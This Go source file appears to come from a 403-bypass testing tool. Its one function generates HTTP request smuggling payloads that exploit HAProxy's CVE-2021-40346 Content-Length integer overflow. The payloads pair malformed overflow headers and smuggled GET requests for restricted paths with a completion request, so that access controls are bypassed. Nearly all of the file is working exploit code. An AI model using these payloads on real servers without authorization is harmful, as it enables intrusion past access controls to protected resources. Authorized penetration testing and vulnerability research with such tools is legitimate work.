package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// https://github.com/donky16/CVE-2021-40346-POC

/*
GenerateHAProxyBypassPayloads generates payloads for exploiting the HAProxy CVE-2021-40346
integer overflow vulnerability that leads to HTTP Request Smuggling.

The vulnerability works in two phases:
 1. First request: Contains malformed Content-Length header that causes integer overflow
    in HAProxy's header parsing. This request contains a partial smuggled request.
 2. Second request: Normal request that completes the smuggled request when interpreted
    by the backend.

This approach follows how HTTP Request Smuggling works in practice, where:
  - HAProxy sees each request as separate/valid
  - The backend sees the body of request #1 + request #2 as a single complete request
    that bypasses HAProxy's access controls

References:
- https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
- https://github.com/donky16/CVE-2021-40346-POC
*/
func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	// Extract target host and path
	host := parsedURL.Host
	path := parsedURL.Path
	if parsedURL.Query != "" {
		path += "?" + parsedURL.Query
	}

	// We'll test various public endpoints before the restricted one
	publicPaths := []string{
		"/",
		"/guest",
		"/index.html",
		"/index.php",
		"/api",
		"/public",
	}

	// This job will be used for Phase 2 (completion request)
	completionJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         host,
		RawURI:       "/guest",                 // Use a likely public path
		BypassModule: bypassModule + "_phase2", // Mark as phase 2
		Headers:      []Headers{},
	}
	completionJob.PayloadToken = GeneratePayloadToken(completionJob)

	// First generate the completion request - it will be sent after each Phase 1 request
	allJobs = append(allJobs, completionJob)

	// Generate various overflow patterns
	overflowPatterns := []struct {
		repeat string
		count  int
	}{
		{"a", 200},     // Original working pattern
		{"03v1L", 50},  // From JFrog PoC
		{"0", 180},     // Numeric pattern
		{"AAAAA", 180}, // Standard overflow pattern
	}

	// For each public path, try to smuggle a request to the target path
	for _, publicPath := range publicPaths {
		for _, pattern := range overflowPatterns {
			// Create the smuggled request based on the working example
			// Important: Use \r\n instead of \n for proper HTTP formatting
			smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
				path,       // Target/restricted path
				publicPath, // Public path for header value camouflage
				host)

			// Calculate content length for the payload
			contentLen := len(smuggledRequest)

			// Create overflow Content-Length header
			contentLengthName := "Content-Length" + strings.Repeat(pattern.repeat, pattern.count)

			// Create base payload for phase 1
			job := BypassPayload{
				OriginalURL:  targetURL,
				Method:       "POST",
				Scheme:       parsedURL.Scheme,
				Host:         host,
				RawURI:       publicPath, // Use the public path in the initial request
				BypassModule: bypassModule,
				Body:         smuggledRequest,
				Headers: []Headers{
					{
						Header: contentLengthName,
						Value:  "0",
					},
					{
						Header: "Content-Length",
						Value:  fmt.Sprintf("%d", contentLen),
					},
				},
			}

			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) for %s", len(allJobs), targetURL)
	return allJobs
}
